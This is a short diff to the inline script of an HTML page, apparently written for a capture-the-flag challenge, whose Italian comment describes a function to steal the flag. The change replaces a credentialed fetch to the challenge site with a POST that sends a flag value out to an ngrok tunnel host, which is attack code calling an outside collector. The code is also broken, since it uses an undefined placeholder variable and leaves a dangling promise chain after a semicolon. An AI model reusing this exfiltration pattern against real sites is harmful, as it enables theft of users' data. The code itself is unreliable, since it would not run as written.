@@ -11,11 +11,17 @@
     <script>
         // Funzione per rubare la flag
         const stealFlag = () => {
-            fetch('https://matrix-simplified.capturetheflags.site/search?s=flag', {
-                method: 'GET',
-                credentials: 'include',
-                mode: 'cors'
+            fetch('https://c787-87-4-142-72.ngrok-free.app/receive_flag', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: `flag=${encodeURIComponent(yourFlagVariable)}`
             })
+            .then(response => response.text())
+            .then(data => console.log(data))
+            .catch(error => console.error('Errore:', error));
+
             .then(response => {
                 if (!response.ok) {
                     throw new Error('Network response was not ok ' + response.statusText);
